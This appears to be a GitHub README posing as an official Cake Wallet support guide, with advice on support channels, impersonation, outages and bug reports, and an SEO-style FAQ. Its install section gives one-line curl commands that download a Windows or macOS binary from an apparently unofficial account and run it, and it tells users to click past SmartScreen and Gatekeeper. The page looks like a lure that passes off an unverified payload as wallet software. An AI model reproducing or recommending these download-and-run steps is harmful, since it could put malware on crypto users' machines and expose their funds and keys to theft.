![Cake Wallet official support guide](assets/cake-wallet-official-support-article-banner.png)

# Cake Wallet Support: Official Channels and Status

Where to ask, what support cannot do, and how to tell it is not support.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Support runs through the in-app path, the documented email address and the public repository. None of them can recover, freeze or reverse a transfer, and none needs your recovery phrase. If the app is not working for many people at once, the repository and community channels show it; a single wallet problem is not an outage.

<!-- ARTICLE-BODY-BEGIN -->

## What support can and cannot do
Support can explain a flow, confirm what a release changed and point at a bug report. It cannot move funds, unlock a wallet or reverse a transaction, because the keys are on your device and the chain does not allow reversal.

That limit is the reason impersonation works: someone promising recovery is offering something the real project cannot do. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md">Is Cake Wallet safe</a> covers the custody model behind that limit.

## Recognising impersonation
Real support never asks for a recovery phrase, a PIN, a private key or a screen share of the wallet. It also does not open conversations with you first. A message that does any of those is not support, whatever the display name says.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md">Spot a fake Cake Wallet app</a> covers the download side of the same problem, where a clone listing plays the role of the fake support agent.

## Status and outages
There is no status page that guarantees the app is up, because the app is not a service: it talks to nodes and to providers, each with its own uptime. A wallet that cannot connect is usually one node, not the product.

If several people report the same failure at once, the repository and community channels show it within minutes. That is the closest thing to an outage signal, and it is worth checking before a reinstall.

## Reporting a bug
Reproduce it on the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> first, then write down the build, the platform and the exact steps. A report that starts with "it doesn't work" cannot be acted on, while one with a version and a sequence usually can.

Never attach a phrase, a key or a wallet file to a report. A screenshot of an error is fine; a screenshot of your backup is a leak.

## Questions that are really product questions
Some support requests are answered faster by the product pages than by a person: which coins are supported, whether Lightning works, whether a hardware device is compatible. Those are all published and stable enough to check first.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md">What Cake Wallet is</a> and the rest of this collection cover them, which is often quicker than waiting for a reply.

## When the node is the problem
A large share of "Cake Wallet is down" reports are a single unreachable node or a provider outage. The wallet has no server of its own to be down.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md">Cake Wallet sync problems</a> covers how to tell that apart from a real fault, and why switching nodes resolves most of it.

## FAQ
### How do I contact Cake Wallet support?
Through the in-app support path or the documented email address, plus the public repository for bugs.
### Is Cake Wallet down right now?
The app has no central service to go down. Check the repository for widespread reports, and check your node.
### Does Cake Wallet support Zano?
Not in the documented coin set. The supported list is the authority, not a search result.
### Does Monero wallet support USDT?
Monero has no token layer, so USDT exists on other chains. Cake Wallet holds USDT on the chains that support it.
### Which wallets support Lightning?
Cake Wallet carries a Lightning balance for Bitcoin on builds that implement it, alongside other wallets that do their own thing.
### Which hardware wallets work on each platform?
Ledger, Trezor, BitBox, COLDCARD and Cupcake, with per-platform limits: no hardware wallets on Linux, Bluetooth Ledger on macOS.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[is Cake Wallet safe](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) · [spot a fake Cake Wallet app](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) · [Cake Wallet sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
